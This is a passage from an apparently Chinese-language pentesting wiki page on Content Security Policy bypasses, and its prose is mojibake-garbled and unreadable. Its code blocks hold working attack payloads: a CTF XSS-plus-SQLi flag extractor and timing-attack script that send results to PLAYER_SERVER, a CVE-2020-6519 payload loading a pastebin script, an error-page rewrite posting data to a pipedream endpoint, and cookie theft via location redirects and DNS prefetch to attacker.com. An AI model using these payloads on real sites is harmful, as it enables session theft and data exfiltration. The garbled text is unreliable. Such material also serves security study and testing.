<p>æ‚¨å¯ä»¥é€šè¿‡å›¾åƒæ³„éœ²æ•°æ®æ¥ç»•è¿‡æ­¤ CSPï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒXSS æ»¥ç”¨ä¸€ä¸ª CSRFï¼Œå…¶ä¸­ä¸€ä¸ªå¯ç”±æœºå™¨äººè®¿é—®çš„é¡µé¢åŒ…å« SQLiï¼Œå¹¶é€šè¿‡å›¾åƒæå–æ ‡å¿—ï¼‰ï¼š</p>
<pre><code class="language-javascript">&lt;script&gt;fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=&gt;_.text()).then(_=&gt;new Image().src='http://PLAYER_SERVER/?'+_)&lt;/script&gt;
</code></pre>
<p>From: <a href="https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle">https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle</a></p>
<p>æ‚¨è¿˜å¯ä»¥åˆ©ç”¨æ­¤é…ç½®æ¥<strong>åŠ è½½æ’å…¥åœ¨å›¾åƒä¸­çš„javascriptä»£ç </strong>ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¡µé¢å…è®¸ä»TwitteråŠ è½½å›¾åƒã€‚æ‚¨å¯ä»¥<strong>åˆ¶ä½œ</strong>ä¸€ä¸ª<strong>ç‰¹æ®Šå›¾åƒ</strong>ï¼Œ<strong>ä¸Šä¼ </strong>åˆ°Twitterå¹¶åˆ©ç”¨â€œ<strong>unsafe-inline</strong>â€æ¥<strong>æ‰§è¡Œ</strong>ä¸€æ®µJSä»£ç ï¼ˆä½œä¸ºå¸¸è§„XSSï¼‰ï¼Œè¯¥ä»£ç å°†<strong>åŠ è½½</strong>è¯¥<strong>å›¾åƒ</strong>ï¼Œ<strong>æå–</strong>å…¶ä¸­çš„<strong>JS</strong>å¹¶<strong>æ‰§è¡Œ</strong>å®ƒï¼š<a href="https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/">https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/</a></p>
<h3 id="ä½¿ç”¨æœåŠ¡å·¥ä½œè€…"><a class="header" href="#ä½¿ç”¨æœåŠ¡å·¥ä½œè€…">ä½¿ç”¨æœåŠ¡å·¥ä½œè€…</a></h3>
<p>æœåŠ¡å·¥ä½œè€…çš„**<code>importScripts</code>**å‡½æ•°ä¸å—CSPé™åˆ¶ï¼š</p>
<p>{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
<a href="../xss-cross-site-scripting/abusing-service-workers.html">abusing-service-workers.md</a>
{% endcontent-ref %}</p>
<h3 id="ç­–ç•¥æ³¨å…¥"><a class="header" href="#ç­–ç•¥æ³¨å…¥">ç­–ç•¥æ³¨å…¥</a></h3>
<p><strong>ç ”ç©¶ï¼š</strong> <a href="https://portswigger.net/research/bypassing-csp-with-policy-injection"><strong>https://portswigger.net/research/bypassing-csp-with-policy-injection</strong></a></p>
<h4 id="chrome"><a class="header" href="#chrome">Chrome</a></h4>
<p>å¦‚æœæ‚¨å‘é€çš„<strong>å‚æ•°</strong>è¢«<strong>ç²˜è´´åœ¨</strong> <strong>ç­–ç•¥çš„å£°æ˜</strong>ä¸­ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥ä»¥æŸç§æ–¹å¼<strong>æ›´æ”¹</strong>è¯¥<strong>ç­–ç•¥</strong>ï¼Œä½¿å…¶<strong>æ— æ•ˆ</strong>ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»»ä½•ç»•è¿‡æ–¹æ³•<strong>å…è®¸è„šæœ¬ 'unsafe-inline'</strong>ï¼š</p>
<pre><code class="language-bash">script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
</code></pre>
<p>å› ä¸ºè¿™ä¸ªæŒ‡ä»¤ä¼š<strong>è¦†ç›–ç°æœ‰çš„ script-src æŒ‡ä»¤</strong>ã€‚<br />
ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­: <a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&amp;y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E</a></p>
<h4 id="edge"><a class="header" href="#edge">Edge</a></h4>
<p>åœ¨ Edge ä¸­æ›´ç®€å•ã€‚å¦‚æœä½ å¯ä»¥åœ¨ CSP ä¸­æ·»åŠ è¿™ä¸ª: <strong><code>;_</code></strong> <strong>Edge</strong> ä¼š<strong>ä¸¢å¼ƒ</strong>æ•´ä¸ª<strong>ç­–ç•¥</strong>ã€‚<br />
ä¾‹å­: <a href="http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E">http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&amp;y=%3Cscript%3Ealert(1)%3C/script%3E</a></p>
<h3 id="img-src--é€šè¿‡-xss-iframe---æ—¶é—´æ”»å‡»"><a class="header" href="#img-src--é€šè¿‡-xss-iframe---æ—¶é—´æ”»å‡»">img-src *; é€šè¿‡ XSS (iframe) - æ—¶é—´æ”»å‡»</a></h3>
<p>æ³¨æ„ç¼ºå°‘æŒ‡ä»¤ <code>'unsafe-inline'</code><br />
è¿™æ¬¡ä½ å¯ä»¥è®©å—å®³è€…é€šè¿‡ <strong>XSS</strong> ä½¿ç”¨ <code>&lt;iframe</code> åŠ è½½ä¸€ä¸ªåœ¨<strong>ä½ æ§åˆ¶</strong>ä¸‹çš„é¡µé¢ã€‚è¿™æ¬¡ä½ å°†è®©å—å®³è€…è®¿é—®ä½ æƒ³è¦æå–ä¿¡æ¯çš„é¡µé¢ï¼ˆ<strong>CSRF</strong>ï¼‰ã€‚ä½ æ— æ³•è®¿é—®é¡µé¢çš„å†…å®¹ï¼Œä½†å¦‚æœä½ èƒ½<strong>æ§åˆ¶é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´</strong>ï¼Œä½ å°±å¯ä»¥æå–æ‰€éœ€çš„ä¿¡æ¯ã€‚</p>
<p>è¿™æ¬¡å°†æå–ä¸€ä¸ª<strong>æ ‡å¿—</strong>ï¼Œæ¯å½“é€šè¿‡ SQLi <strong>æ­£ç¡®çŒœæµ‹ä¸€ä¸ªå­—ç¬¦</strong>æ—¶ï¼Œ<strong>å“åº”</strong>ç”±äº sleep å‡½æ•°ä¼š<strong>èŠ±è´¹æ›´å¤šæ—¶é—´</strong>ã€‚ç„¶åï¼Œä½ å°†èƒ½å¤Ÿæå–æ ‡å¿—:</p>
<pre><code class="language-html">&lt;!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle --&gt;
&lt;iframe name=f id=g&gt;&lt;/iframe&gt; // The bot will load an URL with the payload
&lt;script&gt;
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r =&gt; {
g.onload = r;
});
let diff = performance.now() - h;
return diff &gt; 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i&lt;alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
&lt;/script&gt;
</code></pre>
<h3 id="é€šè¿‡ä¹¦ç­¾å°ç¨‹åº"><a class="header" href="#é€šè¿‡ä¹¦ç­¾å°ç¨‹åº">é€šè¿‡ä¹¦ç­¾å°ç¨‹åº</a></h3>
<p>æ­¤æ”»å‡»å°†æ¶‰åŠä¸€äº›ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œæ”»å‡»è€…<strong>è¯´æœç”¨æˆ·å°†é“¾æ¥æ‹–æ”¾åˆ°æµè§ˆå™¨çš„ä¹¦ç­¾å°ç¨‹åºä¸Š</strong>ã€‚æ­¤ä¹¦ç­¾å°ç¨‹åºå°†åŒ…å«<strong>æ¶æ„çš„javascript</strong>ä»£ç ï¼Œå½“è¢«æ‹–æ”¾æˆ–ç‚¹å‡»æ—¶ï¼Œå°†åœ¨å½“å‰ç½‘é¡µçª—å£çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œ<strong>ç»•è¿‡CSPå¹¶å…è®¸çªƒå–æ•æ„Ÿä¿¡æ¯</strong>ï¼Œå¦‚cookiesæˆ–tokensã€‚</p>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·<a href="https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/"><strong>æŸ¥çœ‹åŸå§‹æŠ¥å‘Š</strong></a>ã€‚</p>
<h3 id="é€šè¿‡é™åˆ¶cspç»•è¿‡csp"><a class="header" href="#é€šè¿‡é™åˆ¶cspç»•è¿‡csp">é€šè¿‡é™åˆ¶CSPç»•è¿‡CSP</a></h3>
<p>åœ¨<a href="https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution"><strong>è¿™ä¸ªCTFå†™ä½œ</strong></a>ä¸­ï¼ŒCSPé€šè¿‡åœ¨å…è®¸çš„iframeä¸­æ³¨å…¥æ›´ä¸¥æ ¼çš„CSPæ¥ç»•è¿‡ï¼Œè¯¥CSPä¸å…è®¸åŠ è½½ç‰¹å®šçš„JSæ–‡ä»¶ï¼Œç„¶åé€šè¿‡<strong>åŸå‹æ±¡æŸ“</strong>æˆ–<strong>DOMè¦†ç›–</strong>å…è®¸<strong>æ»¥ç”¨ä¸åŒçš„è„šæœ¬æ¥åŠ è½½ä»»æ„è„šæœ¬</strong>ã€‚</p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨**<code>csp</code><strong>å±æ€§</strong>é™åˆ¶iframeçš„CSP**ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-html">&lt;iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"&gt;&lt;/iframe&gt;
</code></pre>
<p>{% endcode %}</p>
<p>åœ¨<a href="https://github.com/aszx87410/ctf-writeups/issues/48"><strong>è¿™ä¸ªCTFå†™ä½œ</strong></a>ä¸­ï¼Œé€šè¿‡<strong>HTMLæ³¨å…¥</strong>å¯ä»¥<strong>è¿›ä¸€æ­¥é™åˆ¶</strong>ä¸€ä¸ª<strong>CSP</strong>ï¼Œä»è€Œç¦ç”¨é˜²æ­¢CSTIçš„è„šæœ¬ï¼Œå› æ­¤<strong>æ¼æ´å˜å¾—å¯åˆ©ç”¨ã€‚</strong><br />
å¯ä»¥ä½¿ç”¨<strong>HTMLå…ƒæ ‡ç­¾</strong>ä½¿CSPæ›´åŠ ä¸¥æ ¼ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡<strong>ç§»é™¤</strong>å…è®¸å…¶<strong>nonce</strong>çš„<strong>å…¥å£</strong>æ¥ç¦ç”¨å†…è”è„šæœ¬ï¼Œå¹¶é€šè¿‡sha<strong>å¯ç”¨ç‰¹å®šçš„å†…è”è„šæœ¬</strong>ï¼š</p>
<pre><code class="language-html">&lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';"&gt;
</code></pre>
<h3 id="js-exfiltration-with-content-security-policy-report-only"><a class="header" href="#js-exfiltration-with-content-security-policy-report-only">JS exfiltration with Content-Security-Policy-Report-Only</a></h3>
<p>å¦‚æœä½ èƒ½è®©æœåŠ¡å™¨å“åº”å¸¦æœ‰ <strong><code>Content-Security-Policy-Report-Only</code></strong> å¤´éƒ¨ä¸” <strong>å€¼ç”±ä½ æ§åˆ¶</strong>ï¼ˆå¯èƒ½æ˜¯å› ä¸º CRLFï¼‰ï¼Œä½ å¯ä»¥è®©å®ƒæŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¦‚æœä½  <strong>åŒ…è£¹</strong> ä½ æƒ³è¦æ³„éœ²çš„ <strong>JS å†…å®¹</strong> ä½¿ç”¨ <strong><code>&lt;script&gt;</code></strong>ï¼Œå¹¶ä¸”å› ä¸º CSP å¾ˆå¯èƒ½ä¸å…è®¸ <code>unsafe-inline</code>ï¼Œè¿™å°† <strong>è§¦å‘ CSP é”™è¯¯</strong>ï¼Œå¹¶ä¸”éƒ¨åˆ†è„šæœ¬ï¼ˆåŒ…å«æ•æ„Ÿä¿¡æ¯ï¼‰å°†ä» <code>Content-Security-Policy-Report-Only</code> å‘é€åˆ°æœåŠ¡å™¨ã€‚</p>
<p>å¯¹äºä¸€ä¸ªä¾‹å­ <a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes"><strong>æŸ¥çœ‹è¿™ä¸ª CTF æ–‡ç« </strong></a>ã€‚</p>
<h3 id="cve-2020-6519"><a class="header" href="#cve-2020-6519"><a href="https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/">CVE-2020-6519</a></a></h3>
<pre><code class="language-javascript">document.querySelector('DIV').innerHTML="&lt;iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'&gt;&lt;/iframe&gt;";
</code></pre>
<h3 id="é€šè¿‡cspå’Œiframeæ³„éœ²ä¿¡æ¯"><a class="header" href="#é€šè¿‡cspå’Œiframeæ³„éœ²ä¿¡æ¯">é€šè¿‡CSPå’ŒIframeæ³„éœ²ä¿¡æ¯</a></h3>
<ul>
<li>åˆ›å»ºä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªURLçš„<code>iframe</code>ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º<code>https://example.redirect.com</code>ï¼‰ï¼Œè¯¥URLè¢«CSPå…è®¸ã€‚</li>
<li>è¯¥URLéšåé‡å®šå‘åˆ°ä¸€ä¸ªç§˜å¯†URLï¼ˆä¾‹å¦‚ï¼Œ<code>https://usersecret.example2.com</code>ï¼‰ï¼Œè¯¥URL <strong>ä¸è¢«</strong> CSPå…è®¸ã€‚</li>
<li>é€šè¿‡ç›‘å¬<code>securitypolicyviolation</code>äº‹ä»¶ï¼Œå¯ä»¥æ•è·<code>blockedURI</code>å±æ€§ã€‚è¯¥å±æ€§æ­ç¤ºäº†è¢«é˜»æ­¢çš„URIçš„åŸŸåï¼Œä»è€Œæ³„éœ²äº†åˆå§‹URLé‡å®šå‘çš„ç§˜å¯†åŸŸåã€‚</li>
</ul>
<p>æœ‰è¶£çš„æ˜¯ï¼ŒåƒChromeå’ŒFirefoxè¿™æ ·çš„æµè§ˆå™¨åœ¨å¤„ç†ä¸CSPç›¸å…³çš„iframesæ—¶è¡¨ç°ä¸åŒï¼Œå¯èƒ½å¯¼è‡´ç”±äºæœªå®šä¹‰è¡Œä¸ºè€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>å¦ä¸€ç§æŠ€æœ¯æ¶‰åŠåˆ©ç”¨CSPæœ¬èº«æ¨æ–­ç§˜å¯†å­åŸŸåã€‚è¯¥æ–¹æ³•ä¾èµ–äºäºŒåˆ†æœç´¢ç®—æ³•ï¼Œå¹¶è°ƒæ•´CSPä»¥åŒ…å«æ•…æ„è¢«é˜»æ­¢çš„ç‰¹å®šåŸŸåã€‚ä¾‹å¦‚ï¼Œå¦‚æœç§˜å¯†å­åŸŸåç”±æœªçŸ¥å­—ç¬¦ç»„æˆï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹CSPæŒ‡ä»¤æ¥é˜»æ­¢æˆ–å…è®¸è¿™äº›å­åŸŸåï¼Œé€æ­¥æµ‹è¯•ä¸åŒçš„å­åŸŸåã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç‰‡æ®µï¼Œå±•ç¤ºäº†å¦‚ä½•è®¾ç½®CSPä»¥ä¿ƒè¿›æ­¤æ–¹æ³•ï¼š</p>
<pre><code class="language-markdown">img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
</code></pre>
<p>é€šè¿‡ç›‘æ§å“ªäº›è¯·æ±‚è¢«CSPé˜»æ­¢æˆ–å…è®¸ï¼Œå¯ä»¥ç¼©å°ç§˜å¯†å­åŸŸåä¸­å¯èƒ½çš„å­—ç¬¦èŒƒå›´ï¼Œæœ€ç»ˆæ­ç¤ºå®Œæ•´çš„URLã€‚</p>
<p>è¿™ä¸¤ç§æ–¹æ³•åˆ©ç”¨äº†CSPåœ¨æµè§ˆå™¨ä¸­çš„å®ç°å’Œè¡Œä¸ºçš„ç»†å¾®å·®åˆ«ï¼Œå±•ç¤ºäº†çœ‹ä¼¼å®‰å…¨çš„ç­–ç•¥å¦‚ä½•æ— æ„ä¸­æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>æ¥è‡ª<a href="https://ctftime.org/writeup/29310"><strong>è¿™é‡Œ</strong></a>çš„æŠ€å·§ã€‚</p>
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥<a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a>æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘å¯åŠ¨å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>åŠ å…¥æˆ‘ä»¬</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œï¼</p>
<h2 id="ç»•è¿‡cspçš„å±é™©æŠ€æœ¯"><a class="header" href="#ç»•è¿‡cspçš„å±é™©æŠ€æœ¯">ç»•è¿‡CSPçš„å±é™©æŠ€æœ¯</a></h2>
<h3 id="å‚æ•°è¿‡å¤šæ—¶çš„phpé”™è¯¯"><a class="header" href="#å‚æ•°è¿‡å¤šæ—¶çš„phpé”™è¯¯">å‚æ•°è¿‡å¤šæ—¶çš„PHPé”™è¯¯</a></h3>
<p>æ ¹æ®<a href="https://www.youtube.com/watch?v=Sm4G6cAHjWM"><strong>è¿™ä¸ªè§†é¢‘ä¸­è¯„è®ºçš„æœ€åä¸€ä¸ªæŠ€æœ¯</strong></a>ï¼Œå‘é€è¿‡å¤šå‚æ•°ï¼ˆ1001ä¸ªGETå‚æ•°ï¼Œå°½ç®¡ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨POSTå‚æ•°å’Œè¶…è¿‡20ä¸ªæ–‡ä»¶ï¼‰ã€‚ä»»ä½•åœ¨PHPç½‘é¡µä»£ç ä¸­å®šä¹‰çš„**<code>header()</code><strong>éƒ½</strong>ä¸ä¼šè¢«å‘é€**ï¼Œå› ä¸ºè¿™å°†è§¦å‘é”™è¯¯ã€‚</p>
<h3 id="phpå“åº”ç¼“å†²åŒºæº¢å‡º"><a class="header" href="#phpå“åº”ç¼“å†²åŒºæº¢å‡º">PHPå“åº”ç¼“å†²åŒºæº¢å‡º</a></h3>
<p>PHPä»¥é»˜è®¤æ–¹å¼<strong>ç¼“å†²å“åº”è‡³4096</strong>å­—èŠ‚ã€‚å› æ­¤ï¼Œå¦‚æœPHPæ˜¾ç¤ºè­¦å‘Šï¼Œé€šè¿‡æä¾›<strong>è¶³å¤Ÿçš„æ•°æ®åœ¨è­¦å‘Šä¸­</strong>ï¼Œ<strong>å“åº”</strong>å°†<strong>åœ¨</strong> <strong>CSPå¤´</strong>ä¹‹å‰<strong>å‘é€</strong>ï¼Œå¯¼è‡´å¤´è¢«å¿½ç•¥ã€‚<br />
ç„¶åï¼Œè¿™ä¸ªæŠ€æœ¯åŸºæœ¬ä¸Šæ˜¯<strong>ç”¨è­¦å‘Šå¡«å……å“åº”ç¼“å†²åŒº</strong>ï¼Œä»¥ä¾¿CSPå¤´ä¸è¢«å‘é€ã€‚</p>
<p>æ¥è‡ª<a href="https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points"><strong>è¿™ä¸ªå†™ä½œ</strong></a>çš„æƒ³æ³•ã€‚</p>
<h3 id="é‡å†™é”™è¯¯é¡µé¢"><a class="header" href="#é‡å†™é”™è¯¯é¡µé¢">é‡å†™é”™è¯¯é¡µé¢</a></h3>
<p>æ ¹æ®<a href="https://blog.ssrf.kr/69"><strong>è¿™ä¸ªå†™ä½œ</strong></a>ï¼Œä¼¼ä¹å¯ä»¥é€šè¿‡åŠ è½½ä¸€ä¸ªé”™è¯¯é¡µé¢ï¼ˆå¯èƒ½æ²¡æœ‰CSPï¼‰å¹¶é‡å†™å…¶å†…å®¹æ¥ç»•è¿‡CSPä¿æŠ¤ã€‚</p>
<pre><code class="language-javascript">a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `&lt;img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=&gt;x.text()).then(x=&gt;fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))"&gt;`;
}, 1000);
</code></pre>
<h3 id="some--self--wordpress"><a class="header" href="#some--self--wordpress">SOME + 'self' + wordpress</a></h3>
<p>SOMEæ˜¯ä¸€ç§åˆ©ç”¨XSSï¼ˆæˆ–é«˜åº¦é™åˆ¶çš„XSSï¼‰<strong>åœ¨é¡µé¢çš„ä¸€ä¸ªç«¯ç‚¹</strong>ä¸­<strong>æ»¥ç”¨</strong> <strong>åŒä¸€æ¥æºçš„å…¶ä»–ç«¯ç‚¹</strong>çš„æŠ€æœ¯ã€‚è¿™æ˜¯é€šè¿‡ä»æ”»å‡»è€…é¡µé¢åŠ è½½æ˜“å—æ”»å‡»çš„ç«¯ç‚¹ï¼Œç„¶åå°†æ”»å‡»è€…é¡µé¢åˆ·æ–°åˆ°æ‚¨æƒ³è¦æ»¥ç”¨çš„åŒä¸€æ¥æºçš„çœŸå®ç«¯ç‚¹æ¥å®ç°çš„ã€‚è¿™æ ·ï¼Œ<strong>æ˜“å—æ”»å‡»çš„ç«¯ç‚¹</strong>å¯ä»¥åœ¨<strong>æœ‰æ•ˆè½½è·</strong>ä¸­ä½¿ç”¨**<code>opener</code><strong>å¯¹è±¡æ¥</strong>è®¿é—®** <strong>è¦æ»¥ç”¨çš„çœŸå®ç«¯ç‚¹çš„DOM</strong>ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
<a href="../xss-cross-site-scripting/some-same-origin-method-execution.html">some-same-origin-method-execution.md</a>
{% endcontent-ref %}</p>
<p>æ­¤å¤–ï¼Œ<strong>wordpress</strong>åœ¨<code>/wp-json/wp/v2/users/1?_jsonp=data</code>ä¸­æœ‰ä¸€ä¸ª<strong>JSONP</strong>ç«¯ç‚¹ï¼Œè¯¥ç«¯ç‚¹å°†<strong>åå°„</strong>è¾“å‡ºä¸­å‘é€çš„<strong>æ•°æ®</strong>ï¼ˆä»…é™å­—æ¯ã€æ•°å­—å’Œç‚¹çš„é™åˆ¶ï¼‰ã€‚</p>
<p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥ç«¯ç‚¹<strong>ç”Ÿæˆé’ˆå¯¹WordPressçš„SOMEæ”»å‡»</strong>å¹¶å°†å…¶åµŒå…¥<code>&lt;script s</code>rc=<code>/wp-json/wp/v2/users/1?_jsonp=some_attack&gt;&lt;/script&gt;</code>ä¸­ï¼Œè¯·æ³¨æ„è¿™ä¸ª<strong>è„šæœ¬</strong>å°†è¢«<strong>åŠ è½½</strong>ï¼Œå› ä¸ºå®ƒæ˜¯<strong>è¢«'self'å…è®¸çš„</strong>ã€‚æ­¤å¤–ï¼Œç”±äºå®‰è£…äº†WordPressï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡<strong>æ˜“å—æ”»å‡»çš„</strong> <strong>å›è°ƒ</strong>ç«¯ç‚¹æ»¥ç”¨<strong>SOMEæ”»å‡»</strong>ï¼Œè¯¥ç«¯ç‚¹<strong>ç»•è¿‡CSP</strong>ä»¥ç»™äºˆç”¨æˆ·æ›´å¤šæƒé™ï¼Œå®‰è£…æ–°æ’ä»¶...<br />
æœ‰å…³å¦‚ä½•æ‰§è¡Œæ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹<a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a></p>
<h2 id="csp-exfiltration-bypasses"><a class="header" href="#csp-exfiltration-bypasses">CSP Exfiltration Bypasses</a></h2>
<p>å¦‚æœå­˜åœ¨ä¸¥æ ¼çš„CSPï¼Œä¸å…è®¸æ‚¨<strong>ä¸å¤–éƒ¨æœåŠ¡å™¨äº¤äº’</strong>ï¼Œåˆ™å§‹ç»ˆå¯ä»¥åšä¸€äº›äº‹æƒ…æ¥æå–ä¿¡æ¯ã€‚</p>
<h3 id="location"><a class="header" href="#location">Location</a></h3>
<p>æ‚¨å¯ä»¥ä»…æ›´æ–°ä½ç½®ä»¥å°†æœºå¯†ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š</p>
<pre><code class="language-javascript">var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
</code></pre>
<h3 id="meta-tag"><a class="header" href="#meta-tag">Meta tag</a></h3>
<p>æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥å…ƒæ ‡ç­¾è¿›è¡Œé‡å®šå‘ï¼ˆè¿™åªæ˜¯é‡å®šå‘ï¼Œä¸ä¼šæ³„éœ²å†…å®¹ï¼‰</p>
<pre><code class="language-html">&lt;meta http-equiv="refresh" content="1; http://attacker.com"&gt;
</code></pre>
<h3 id="dns-prefetch"><a class="header" href="#dns-prefetch">DNS Prefetch</a></h3>
<p>ä¸ºäº†æ›´å¿«åœ°åŠ è½½é¡µé¢ï¼Œæµè§ˆå™¨å°†é¢„å…ˆè§£æä¸»æœºåä¸ºIPåœ°å€å¹¶å°†å…¶ç¼“å­˜ä»¥ä¾›åç»­ä½¿ç”¨ã€‚<br />
æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŒ‡ç¤ºæµè§ˆå™¨é¢„è§£æä¸»æœºåï¼š<code>&lt;link rel="dns-prefetch" href="something.com"&gt;</code></p>
<p>æ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºæ¥<strong>é€šè¿‡DNSè¯·æ±‚å¤–æ³„æ•æ„Ÿä¿¡æ¯</strong>ï¼š</p>
<pre><code class="language-javascript">var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "&lt;link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\"&gt;";
</code></pre>
<p>å¦ä¸€ç§æ–¹æ³•ï¼š</p>
<pre><code class="language-javascript">const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
</code></pre>
<p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼ŒæœåŠ¡å™¨å¯ä»¥å‘é€HTTPå¤´ï¼š</p>
<pre><code>X-DNS-Prefetch-Control: off
</code></pre>
<p>{% hint style="info" %}
